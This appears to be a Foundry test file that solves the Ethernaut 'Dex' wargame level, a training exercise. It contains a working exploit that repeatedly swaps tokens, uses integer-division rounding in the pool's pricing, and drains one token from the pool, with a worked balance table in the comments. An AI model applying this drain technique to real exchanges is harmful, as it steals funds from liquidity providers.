// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/Ethernaut.sol";
import "../src/metrics/Statistics.sol";
import "../src/levels/DexFactory.sol";
import "../src/levels/Dex.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract DexTest is Test {
    using stdStorage for StdStorage;

    Ethernaut ethernaut;
    Statistics statistics;
    address eoa = address(0x1337);

    function setUp() public {
        ethernaut = new Ethernaut();

        // Statistics is actually deployed as upgradeable proxy
        // Deploying and initializing it normally for simplicity
        statistics = new Statistics();
        statistics.initialize(address(ethernaut));

        // Set Statistics contract on Ethernaut
        ethernaut.setStatistics(address(statistics));
    }

    function testDexHack() public {
        /* Level Setup */
        // Deploy level factory: DexFactory
        DexFactory dexFactory = new DexFactory();
        // Register level on Ethernaut
        ethernaut.registerLevel(dexFactory);

        // Set caller to custom address
        vm.startPrank(eoa);
        vm.deal(eoa, 1 ether);

        // Start recording logs to capture new level instance address
        vm.recordLogs();
        // Create new level instance via Ethernaut
        ethernaut.createLevelInstance{value: 0.001 ether}(dexFactory);

        // Parse emitted logs
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(
            entries[11].topics[0],
            keccak256("LevelInstanceCreatedLog(address,address,address)")
            // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelDexCreatedLog = entries[11];

        // Cast bytes32 log arg into address
        address instanceAddress = address(
            uint160(uint256(levelDexCreatedLog.topics[2]))
        );
        emit log_named_address("instanceAddress", instanceAddress);

        // Instantiate level instance
        Dex instance = Dex(payable(instanceAddress));

        /* Level Hack */
        // https://docs.soliditylang.org/en/v0.8.17/types.html#division
        // Since the type of the result of an operation is always the type of one of the operands, division on integers always results in an integer.
        // In Solidity, division rounds towards zero.
        // So division results loses precision. We can exploit this fact when swapping large values
        // Once we have more of a token than whats available in the pool, we can drain the opposite token completely
        // We can get hold of more of a token by continuously swapping max amount of tokens
        // Eg, if we have 65 tokens of B and pool only has 45 tokens of B and 110 tokens of A,
        // we can easily swap 45 tokens of B to get 110 tokens of A, draining token A from pool
        // | User Balance - A | User Balance - B | Pool Balance - A | Pool Balance - B | Swap | swapAmount |
        // | ---------------- | ---------------- | ---------------- | ---------------- | ---- | ---------- |
        // | 10               | 10               | 100              | 100              | 10 A | 10 B       |
        // | 0                | 20               | 110              | 90               | 20 B | 24 A       |
        // | 24               | 0                | 86               | 110              | 24 A | 30 B       |
        // | 0                | 30               | 110              | 80               | 30 B | 41 A       |
        // | 41               | 0                | 69               | 110              | 41 B | 65 B       |
        // | 0                | 65               | 110              | 45               | 65 B | 158 A      |
        //
        // At this point we have 65 token B but pool only has 45 token B. Swapping 65 token B requires 158 token B, which the pool doesn't have. So if we swap just 45 token B, we can drain 110 token A from the pool
        //
        // | 0                | 65               | 110              | 45               | 45 B | 110 A      |
        // | 110              | 20               | 0                | 90               | ---- | -----      |

        IERC20(instance.token1()).approve(address(instance), type(uint256).max);
        IERC20(instance.token2()).approve(address(instance), type(uint256).max);

        bool keepSwapping = true;
        address from = instance.token1();
        address to = instance.token2();
        while (keepSwapping) {
            // Swap
            instance.swap(from, to, IERC20(from).balanceOf(eoa));
            // If we have more of a token than whats available in the pool, stop swapping
            if (
                IERC20(to).balanceOf(eoa) >=
                IERC20(to).balanceOf(address(instance))
            ) keepSwapping = false;
            // Swap from and to
            (from, to) = (to, from);
        }
        // Swap max to drain
        instance.swap(from, to, IERC20(from).balanceOf(address(instance)));

        uint256 poolBalanceTokenTo = IERC20(to).balanceOf(address(instance));
        emit log_named_uint("poolBalanceTokenTo", poolBalanceTokenTo);
        assertTrue(poolBalanceTokenTo == 0);
        uint256 poolBalanceTokenFrom = IERC20(from).balanceOf(
            address(instance)
        );
        emit log_named_uint("poolBalanceTokenFrom", poolBalanceTokenFrom);
        assertTrue(poolBalanceTokenFrom > 0);

        /* Level Submit */
        // Start recording logs to capture level completed log
        vm.recordLogs();
        ethernaut.submitLevelInstance(payable(instanceAddress));

        // Parse emitted logs
        Vm.Log[] memory submitLogsEntries = vm.getRecordedLogs();
        assertEq(
            submitLogsEntries[1].topics[0],
            keccak256("LevelCompletedLog(address,address,address)")
            // event LevelCompletedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelCompletedLog = submitLogsEntries[1];

        // Cast bytes32 log arg into address
        address playerAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[1]))
        );
        emit log_named_address("playerAddress_", playerAddress_);

        address instanceAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[2]))
        );
        emit log_named_address("instanceAddress_", instanceAddress_);

        assertEq(playerAddress_, eoa);
        assertEq(instanceAddress_, instanceAddress);

        vm.stopPrank();
    }
}
